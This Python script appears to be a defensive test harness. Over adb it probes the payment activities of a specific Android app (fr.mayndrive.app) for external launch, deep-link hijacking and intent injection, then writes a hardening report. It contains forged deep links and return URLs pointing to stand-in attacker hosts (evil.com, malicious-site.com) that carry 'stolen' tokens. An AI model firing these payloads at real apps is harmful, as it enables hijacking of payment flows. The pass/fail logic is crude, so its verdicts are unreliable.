#!/usr/bin/env python3
"""
Payment Surface Protection Test
==============================

This script tests the security of exported payment activities in the MaynDrive app
to verify if they are properly protected against malicious intent hijacking.

Based on MobSF analysis findings:
- DropInActivity (Braintree payments)
- Stripe proxy/link handlers  
- FinancialConnections redirect
- BraintreeDeepLinkActivity

These activities are exported (android:exported=true) without custom permissions,
potentially allowing malicious apps to hijack payment flows.
"""

import subprocess
import json
import time
import sys
from typing import List, Dict, Any

class PaymentSurfaceTester:
    def __init__(self):
        self.package_name = "fr.mayndrive.app"
        self.vulnerable_activities = [
            "com.braintreepayments.api.DropInActivity",
            "com.stripe.android.link.LinkRedirectHandlerActivity", 
            "com.stripe.android.payments.StripeBrowserProxyReturnActivity",
            "com.braintreepayments.api.BraintreeDeepLinkActivity",
            "com.stripe.android.financialconnections.lite.FinancialConnectionsSheetLiteRedirectActivity"
        ]
        self.test_results = []
        
    def check_adb_connection(self) -> bool:
        """Check if ADB is connected and device is available"""
        try:
            result = subprocess.run(['adb', 'devices'], capture_output=True, text=True)
            if 'device' in result.stdout and 'List of devices' in result.stdout:
                print("✅ ADB device connected")
                return True
            else:
                print("❌ No ADB device connected")
                return False
        except FileNotFoundError:
            print("❌ ADB not found. Please install Android SDK platform-tools")
            return False
    
    def check_app_installed(self) -> bool:
        """Check if MaynDrive app is installed"""
        try:
            result = subprocess.run([
                'adb', 'shell', 'pm', 'list', 'packages', self.package_name
            ], capture_output=True, text=True)
            
            if self.package_name in result.stdout:
                print(f"✅ {self.package_name} is installed")
                return True
            else:
                print(f"❌ {self.package_name} not found")
                return False
        except Exception as e:
            print(f"❌ Error checking app installation: {e}")
            return False
    
    def test_activity_export(self, activity: str) -> Dict[str, Any]:
        """Test if an activity can be launched externally"""
        test_result = {
            "activity": activity,
            "exported": False,
            "launchable": False,
            "error": None,
            "vulnerable": False
        }
        
        try:
            # Try to launch the activity directly
            cmd = [
                'adb', 'shell', 'am', 'start',
                '-n', f"{self.package_name}/{activity}",
                '--activity-clear-top'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                test_result["launchable"] = True
                test_result["exported"] = True
                test_result["vulnerable"] = True
                print(f"🚨 VULNERABLE: {activity} can be launched externally")
            else:
                # Check if it's a permission issue vs not exported
                if "Permission denied" in result.stderr or "SecurityException" in result.stderr:
                    test_result["exported"] = True
                    test_result["error"] = "Permission denied - but still exported"
                    print(f"⚠️  EXPORTED: {activity} is exported but requires permissions")
                else:
                    test_result["exported"] = False
                    print(f"✅ SECURE: {activity} is not externally accessible")
                    
        except subprocess.TimeoutExpired:
            test_result["error"] = "Timeout - activity may have launched"
            test_result["vulnerable"] = True
            print(f"🚨 TIMEOUT: {activity} may have launched (potential vulnerability)")
        except Exception as e:
            test_result["error"] = str(e)
            print(f"❌ ERROR testing {activity}: {e}")
            
        return test_result
    
    def test_deep_link_hijacking(self) -> Dict[str, Any]:
        """Test deep-link hijacking scenarios"""
        deep_link_tests = {
            "stripe_deep_link": {
                "scheme": "stripe://",
                "activity": "com.stripe.android.financialconnections.lite.FinancialConnectionsSheetLiteRedirectActivity",
                "malicious_payload": "stripe://malicious-redirect?token=stolen_token&amount=999999"
            },
            "braintree_deep_link": {
                "scheme": "mayndriveappddds://", 
                "activity": "com.braintreepayments.api.BraintreeDeepLinkActivity",
                "malicious_payload": "mayndriveappddds://payment?amount=999999&card=stolen_card"
            }
        }
        
        hijacking_results = {}
        
        for test_name, test_data in deep_link_tests.items():
            print(f"\n🔗 Testing {test_name} hijacking...")
            
            try:
                # Try to launch with malicious payload
                cmd = [
                    'adb', 'shell', 'am', 'start',
                    '-a', 'android.intent.action.VIEW',
                    '-d', test_data["malicious_payload"]
                ]
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                
                hijacking_results[test_name] = {
                    "successful": result.returncode == 0,
                    "payload": test_data["malicious_payload"],
                    "error": result.stderr if result.stderr else None,
                    "vulnerable": result.returncode == 0
                }
                
                if result.returncode == 0:
                    print(f"🚨 HIJACKING SUCCESSFUL: {test_name}")
                else:
                    print(f"✅ HIJACKING BLOCKED: {test_name}")
                    
            except Exception as e:
                hijacking_results[test_name] = {
                    "successful": False,
                    "error": str(e),
                    "vulnerable": False
                }
                print(f"❌ ERROR testing {test_name}: {e}")
        
        return hijacking_results
    
    def test_intent_injection(self) -> Dict[str, Any]:
        """Test intent injection with forged return URLs"""
        injection_tests = [
            {
                "name": "stripe_return_url_injection",
                "activity": "com.stripe.android.payments.StripeBrowserProxyReturnActivity",
                "intent_data": {
                    "action": "android.intent.action.VIEW",
                    "data": "https://malicious-site.com/steal-token?stripe_token=stolen",
                    "extra": "android.intent.extra.REFERRER"
                }
            },
            {
                "name": "braintree_payment_injection", 
                "activity": "com.braintreepayments.api.DropInActivity",
                "intent_data": {
                    "action": "android.intent.action.VIEW",
                    "data": "braintree://payment?amount=999999&return_url=https://evil.com",
                    "extra": "com.braintreepayments.api.EXTRA_PAYMENT_METHOD_NONCE"
                }
            }
        ]
        
        injection_results = {}
        
        for test in injection_tests:
            print(f"\n💉 Testing {test['name']}...")
            
            try:
                cmd = [
                    'adb', 'shell', 'am', 'start',
                    '-a', test['intent_data']['action'],
                    '-d', test['intent_data']['data'],
                    '-n', f"{self.package_name}/{test['activity']}"
                ]
                
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                
                injection_results[test['name']] = {
                    "successful": result.returncode == 0,
                    "payload": test['intent_data']['data'],
                    "error": result.stderr if result.stderr else None,
                    "vulnerable": result.returncode == 0
                }
                
                if result.returncode == 0:
                    print(f"🚨 INJECTION SUCCESSFUL: {test['name']}")
                else:
                    print(f"✅ INJECTION BLOCKED: {test['name']}")
                    
            except Exception as e:
                injection_results[test['name']] = {
                    "successful": False,
                    "error": str(e),
                    "vulnerable": False
                }
                print(f"❌ ERROR testing {test['name']}: {e}")
        
        return injection_results
    
    def run_comprehensive_test(self) -> Dict[str, Any]:
        """Run comprehensive payment surface protection test"""
        print("🔍 Starting Payment Surface Protection Test")
        print("=" * 50)
        
        # Check prerequisites
        if not self.check_adb_connection():
            return {"error": "ADB not connected"}
            
        if not self.check_app_installed():
            return {"error": "MaynDrive app not installed"}
        
        print(f"\n🎯 Testing {len(self.vulnerable_activities)} payment activities...")
        
        # Test each vulnerable activity
        activity_results = []
        for activity in self.vulnerable_activities:
            result = self.test_activity_export(activity)
            activity_results.append(result)
            time.sleep(1)  # Brief pause between tests
        
        # Test deep-link hijacking
        print(f"\n🔗 Testing deep-link hijacking scenarios...")
        hijacking_results = self.test_deep_link_hijacking()
        
        # Test intent injection
        print(f"\n💉 Testing intent injection scenarios...")
        injection_results = self.test_intent_injection()
        
        # Compile results
        total_vulnerabilities = sum(1 for r in activity_results if r.get("vulnerable", False))
        total_hijacking_vulnerabilities = sum(1 for r in hijacking_results.values() if r.get("vulnerable", False))
        total_injection_vulnerabilities = sum(1 for r in injection_results.values() if r.get("vulnerable", False))
        
        comprehensive_results = {
            "test_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "package_name": self.package_name,
            "total_activities_tested": len(self.vulnerable_activities),
            "activity_results": activity_results,
            "hijacking_results": hijacking_results,
            "injection_results": injection_results,
            "vulnerability_summary": {
                "exported_activities_vulnerable": total_vulnerabilities,
                "deep_link_hijacking_vulnerable": total_hijacking_vulnerabilities,
                "intent_injection_vulnerable": total_injection_vulnerabilities,
                "total_vulnerabilities": total_vulnerabilities + total_hijacking_vulnerabilities + total_injection_vulnerabilities
            },
            "security_status": "VULNERABLE" if (total_vulnerabilities + total_hijacking_vulnerabilities + total_injection_vulnerabilities) > 0 else "SECURE"
        }
        
        return comprehensive_results
    
    def generate_report(self, results: Dict[str, Any]) -> str:
        """Generate a comprehensive security report"""
        report = f"""
# Payment Surface Protection Test Report

## 🎯 Executive Summary

**Test Date**: {results['test_timestamp']}
**Target App**: {results['package_name']}
**Security Status**: {results['security_status']}

## 📊 Vulnerability Summary

- **Exported Activities Vulnerable**: {results['vulnerability_summary']['exported_activities_vulnerable']}/{results['total_activities_tested']}
- **Deep-Link Hijacking Vulnerable**: {results['vulnerability_summary']['deep_link_hijacking_vulnerable']}
- **Intent Injection Vulnerable**: {results['vulnerability_summary']['intent_injection_vulnerable']}
- **Total Vulnerabilities**: {results['vulnerability_summary']['total_vulnerabilities']}

## 🚨 Detailed Findings

### Exported Activity Analysis
"""
        
        for result in results['activity_results']:
            status = "🚨 VULNERABLE" if result.get('vulnerable', False) else "✅ SECURE"
            report += f"- **{result['activity']}**: {status}\n"
            if result.get('error'):
                report += f"  - Error: {result['error']}\n"
        
        report += "\n### Deep-Link Hijacking Tests\n"
        for test_name, result in results['hijacking_results'].items():
            status = "🚨 VULNERABLE" if result.get('vulnerable', False) else "✅ SECURE"
            report += f"- **{test_name}**: {status}\n"
            if result.get('error'):
                report += f"  - Error: {result['error']}\n"
        
        report += "\n### Intent Injection Tests\n"
        for test_name, result in results['injection_results'].items():
            status = "🚨 VULNERABLE" if result.get('vulnerable', False) else "✅ SECURE"
            report += f"- **{test_name}**: {status}\n"
            if result.get('error'):
                report += f"  - Error: {result['error']}\n"
        
        if results['security_status'] == 'VULNERABLE':
            report += """
## 🛡️ Security Recommendations

### Immediate Actions Required:

1. **Add Custom Permissions**:
   - Define custom permissions for payment activities
   - Set protection level to "signature" or "signatureOrSystem"
   - Require permissions in activity declarations

2. **Implement Intent Validation**:
   - Validate all incoming intent data
   - Sanitize URLs and parameters
   - Implement allowlist for trusted sources

3. **Secure Deep-Link Handling**:
   - Validate deep-link schemes and parameters
   - Implement proper URL validation
   - Add authentication checks for sensitive operations

4. **Activity Protection**:
   - Set android:exported="false" where possible
   - Use intent filters with specific data types
   - Implement proper permission checks

### Code Example for Secure Activity:
```xml
<activity
    android:name="com.braintreepayments.api.DropInActivity"
    android:exported="false"
    android:permission="com.mayndrive.payment.PERMISSION" />
```

### Permission Definition:
```xml
<permission
    android:name="com.mayndrive.payment.PERMISSION"
    android:protectionLevel="signature" />
```
"""
        else:
            report += """
## ✅ Security Status: SECURE

The payment surfaces appear to be properly protected against the tested attack vectors.
Continue monitoring for other potential vulnerabilities.
"""
        
        return report

def main():
    """Main execution function"""
    print("🔒 Payment Surface Protection Tester")
    print("Testing MaynDrive app for payment activity vulnerabilities")
    print("=" * 60)
    
    tester = PaymentSurfaceTester()
    
    try:
        results = tester.run_comprehensive_test()
        
        if "error" in results:
            print(f"❌ Test failed: {results['error']}")
            return 1
        
        # Generate and save report
        report = tester.generate_report(results)
        
        # Save results to file
        with open('/home/ubuntu/Desktop/Project/Attacktest/PAYMENT_SURFACE_PROTECTION_REPORT.md', 'w') as f:
            f.write(report)
        
        with open('/home/ubuntu/Desktop/Project/Attacktest/PAYMENT_SURFACE_PROTECTION_RESULTS.json', 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n📋 Test completed!")
        print(f"📄 Report saved: PAYMENT_SURFACE_PROTECTION_REPORT.md")
        print(f"📊 Results saved: PAYMENT_SURFACE_PROTECTION_RESULTS.json")
        print(f"🔒 Security Status: {results['security_status']}")
        
        return 0 if results['security_status'] == 'SECURE' else 1
        
    except KeyboardInterrupt:
        print("\n⏹️  Test interrupted by user")
        return 1
    except Exception as e:
        print(f"❌ Unexpected error: {e}")
        return 1

if __name__ == "__main__":
    sys.exit(main())
